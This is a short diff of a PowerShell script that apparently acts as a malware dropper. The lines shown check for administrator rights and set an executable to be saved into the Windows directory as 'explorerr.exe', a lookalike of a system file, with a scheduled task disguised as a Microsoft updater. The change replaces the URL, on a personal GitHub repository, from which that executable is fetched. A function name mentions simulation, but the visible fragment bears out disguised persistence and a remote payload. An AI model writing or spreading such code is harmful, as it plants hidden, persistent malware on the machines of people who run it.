@@ -13,7 +13,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 $InstallPath = $env:windir
 $SexeDestination = Join-Path $InstallPath "explorerr.exe" 
-$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe" 
+$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 
 $TaskName = "\Microsoft\Windows\SystemDataUpdater"
 
 function Write-SimulationProgress {
